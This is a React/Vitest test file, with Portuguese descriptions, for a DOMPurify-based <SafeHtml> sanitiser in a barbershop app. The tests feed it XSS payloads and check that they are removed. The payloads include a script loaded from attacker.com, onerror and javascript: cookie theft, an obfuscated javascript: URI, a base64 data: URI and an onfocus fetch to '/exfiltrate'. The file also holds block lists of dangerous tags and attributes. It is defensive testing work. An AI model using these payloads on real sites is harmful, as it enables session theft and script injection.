import React from "react";
import { describe, it, expect, beforeEach } from "vitest";
import { render, screen } from "@testing-library/react";
import { SafeHtml } from "../../components/ui/SafeHtml";
import {
  sanitizeClientHtml,
  STRICT_ALLOWED_TAGS,
  STRICT_FORBIDDEN_TAGS,
  STRICT_FORBIDDEN_ATTR,
  getSanitizerEngineMetrics,
} from "../../security/sanitizerConfig";

describe("Prompt 13 | Wrapper de Sanitização e XSS no Client (<SafeHtml>)", () => {
  beforeEach(() => {
    // Garante ambiente limpo antes de cada caso
  });

  describe("1. Allowlist Estrita e Configuração do DOMPurify", () => {
    it("deve carregar métricas corretas da engine e padrões OWASP", () => {
      const metrics = getSanitizerEngineMetrics();
      expect(metrics.defenseEngine).toContain("DOMPurify");
      expect(metrics.allowedTagsCount).toBeGreaterThan(15);
      expect(metrics.forbiddenTagsCount).toBeGreaterThan(10);
      expect(metrics.protocolBlocklist).toContain("javascript:");
    });

    it("deve conter tags seguras na allowlist estrita", () => {
      expect(STRICT_ALLOWED_TAGS).toContain("b");
      expect(STRICT_ALLOWED_TAGS).toContain("strong");
      expect(STRICT_ALLOWED_TAGS).toContain("i");
      expect(STRICT_ALLOWED_TAGS).toContain("em");
      expect(STRICT_ALLOWED_TAGS).toContain("p");
      expect(STRICT_ALLOWED_TAGS).toContain("a");
      expect(STRICT_ALLOWED_TAGS).toContain("code");
    });

    it("deve conter tags ativas na lista de proibição estrita", () => {
      expect(STRICT_FORBIDDEN_TAGS).toContain("script");
      expect(STRICT_FORBIDDEN_TAGS).toContain("iframe");
      expect(STRICT_FORBIDDEN_TAGS).toContain("object");
      expect(STRICT_FORBIDDEN_TAGS).toContain("embed");
      expect(STRICT_FORBIDDEN_TAGS).toContain("svg");
      expect(STRICT_FORBIDDEN_TAGS).toContain("math");
    });

    it("deve barrar manipuladores de evento perigosos na lista de atributos", () => {
      expect(STRICT_FORBIDDEN_ATTR).toContain("onerror");
      expect(STRICT_FORBIDDEN_ATTR).toContain("onload");
      expect(STRICT_FORBIDDEN_ATTR).toContain("onclick");
      expect(STRICT_FORBIDDEN_ATTR).toContain("onmouseover");
    });
  });

  describe("2. Neutralização de Scripts Inline e Tags Executáveis", () => {
    it("deve expurgar completamente tag <script> e seu conteúdo executável", () => {
      const malicious = '<p>Agendamento VIP</p><script>alert("XSS Injected!");</script>';
      const { container } = render(<SafeHtml html={malicious} />);

      expect(container.querySelector("script")).toBeNull();
      expect(container.innerHTML).not.toContain("<script>");
      expect(container.innerHTML).not.toContain("alert");
      expect(screen.getByText("Agendamento VIP")).toBeInTheDocument();
    });

    it("deve neutralizar variantes obfuscas de script (<SCRIPT>, espaços e quebras)", () => {
      const obfuscated = '<SCRIPT SRC="http://attacker.com/evil.js"></SCRIPT><p>Texto limpo</p>';
      const { container } = render(<SafeHtml html={obfuscated} />);

      expect(container.querySelector("script")).toBeNull();
      expect(container.innerHTML).not.toContain("attacker.com");
      expect(screen.getByText("Texto limpo")).toBeInTheDocument();
    });

    it("deve bloquear tags <iframe>, <object>, <embed> que carregam páginas externas maliciosas", () => {
      const dirty = `
        <div>
          <iframe src="https://phishing-barbearia.com"></iframe>
          <object data="malicious.swf"></object>
          <embed src="exploit.pdf"></embed>
          <span>Barba e Cabelo</span>
        </div>
      `;
      const { container } = render(<SafeHtml html={dirty} />);

      expect(container.querySelector("iframe")).toBeNull();
      expect(container.querySelector("object")).toBeNull();
      expect(container.querySelector("embed")).toBeNull();
      expect(screen.getByText("Barba e Cabelo")).toBeInTheDocument();
    });

    it("deve bloquear ataques baseados em SVG/Math com scripts embutidos", () => {
      const svgXss = '<svg onload="alert(\'svg-xss\')"><circle cx="10" cy="10" r="5"></circle></svg>';
      const { container } = render(<SafeHtml html={svgXss} />);

      expect(container.querySelector("svg")).toBeNull();
      expect(container.innerHTML).not.toContain("onload");
      expect(container.innerHTML).not.toContain("alert");
    });
  });

  describe("3. Supressão de Manipuladores de Eventos (onload, onerror, onclick, etc.)", () => {
    it("deve desarmar onerror em tags <img> ou descarte da tag não permitida", () => {
      const imgPayload = '<img src="invalido.png" onerror="alert(document.cookie)" />';
      const { container } = render(<SafeHtml html={imgPayload} />);

      expect(container.querySelector("img")).toBeNull();
      expect(container.innerHTML).not.toContain("onerror");
      expect(container.innerHTML).not.toContain("document.cookie");
    });

    it("deve neutralizar onclick e onmouseover em elementos com texto", () => {
      const clickableDirty = '<p onclick="stealTokens()" onmouseover="logCoords()">Passe o mouse aqui</p>';
      const { container } = render(<SafeHtml html={clickableDirty} />);

      const p = container.querySelector("p");
      expect(p).toBeInTheDocument();
      expect(p?.hasAttribute("onclick")).toBe(false);
      expect(p?.hasAttribute("onmouseover")).toBe(false);
      expect(container.innerHTML).not.toContain("stealTokens");
      expect(container.innerHTML).not.toContain("logCoords");
    });

    it("deve remover atributos de autofocus e onfocus que disparam automaticamente", () => {
      const focusPayload = '<span onfocus="fetch(\'/exfiltrate\')" autofocus>Texto Focado</span>';
      const { container } = render(<SafeHtml html={focusPayload} />);

      const span = container.querySelector("span");
      expect(span).toBeInTheDocument();
      expect(span?.hasAttribute("onfocus")).toBe(false);
      expect(span?.hasAttribute("autofocus")).toBe(false);
    });
  });

  describe("4. Desarmamento de URIs perigosas (javascript:, data:, vbscript:)", () => {
    it("deve remover href contendo esquema javascript: em links âncora", () => {
      const jsLink = '<a href="javascript:alert(\'Cookie stolen: \' + document.cookie)">Resgatar Cupom</a>';
      const { container } = render(<SafeHtml html={jsLink} />);

      const a = container.querySelector("a");
      expect(a).toBeInTheDocument();
      expect(a?.hasAttribute("href")).toBe(false);
      expect(container.innerHTML).not.toContain("javascript:");
    });

    it("deve desarmar esquemas javascript com entidades HTML (&tab;, maiúsculas)", () => {
      const entityLink = '<a href="jav&#x09;ascript:alert(1)">Clique</a>';
      const { container } = render(<SafeHtml html={entityLink} />);

      const a = container.querySelector("a");
      expect(a?.hasAttribute("href")).toBe(false);
      expect(container.innerHTML).not.toContain("alert(1)");
    });

    it("deve desarmar esquema data:text/html com script embutido", () => {
      const dataLink = '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Baixar NF-e</a>';
      const { container } = render(<SafeHtml html={dataLink} />);

      const a = container.querySelector("a");
      expect(a?.hasAttribute("href")).toBe(false);
    });

    it("deve preservar links HTTPS legítimos e forçar rel='noopener noreferrer' e target='_blank'", () => {
      const safeAnchor = '<a href="https://barbearia.com.br/politica">Política de Privacidade</a>';
      const { container } = render(<SafeHtml html={safeAnchor} />);

      const a = container.querySelector("a");
      expect(a).toBeInTheDocument();
      expect(a?.getAttribute("href")).toBe("https://barbearia.com.br/politica");
      expect(a?.getAttribute("rel")).toContain("noopener");
      expect(a?.getAttribute("rel")).toContain("noreferrer");
      expect(a?.getAttribute("target")).toBe("_blank");
    });
  });

  describe("5. Renderização Segura, Props Polimórficas e Fallbacks", () => {
    it("deve renderizar tags HTML de formatação seguras (strong, em, ul, li)", () => {
      const richContent = "<strong>Combo VIP:</strong> <em>Cabelo + Barboterapia</em>. <ul><li>Navalhado</li></ul>";
      const { container } = render(<SafeHtml html={richContent} />);

      expect(container.querySelector("strong")).toHaveTextContent("Combo VIP:");
      expect(container.querySelector("em")).toHaveTextContent("Cabelo + Barboterapia");
      expect(container.querySelector("ul")).toBeInTheDocument();
      expect(container.querySelector("li")).toHaveTextContent("Navalhado");
    });

    it("deve suportar propriedade polimórfica 'as' (renderizar como span ou section)", () => {
      const { container } = render(<SafeHtml html="<span>Aviso</span>" as="section" className="p-4" />);

      const section = container.querySelector("section");
      expect(section).toBeInTheDocument();
      expect(section?.classList.contains("p-4")).toBe(true);
    });

    it("deve renderizar fallback quando o HTML fornecido for nulo ou vazio", () => {
      render(<SafeHtml html="" fallback={<span data-testid="fallback-el">Sem conteúdo</span>} />);
      expect(screen.getByTestId("fallback-el")).toHaveTextContent("Sem conteúdo");
    });

    it("deve usar a função utilitária pura sanitizeClientHtml diretamente", () => {
      const dirty = '<script>evil()</script><b>Texto Seguro</b>';
      const clean = sanitizeClientHtml(dirty);
      expect(clean).not.toContain("<script>");
      expect(clean).toContain("<b>Texto Seguro</b>");
    });
  });
});
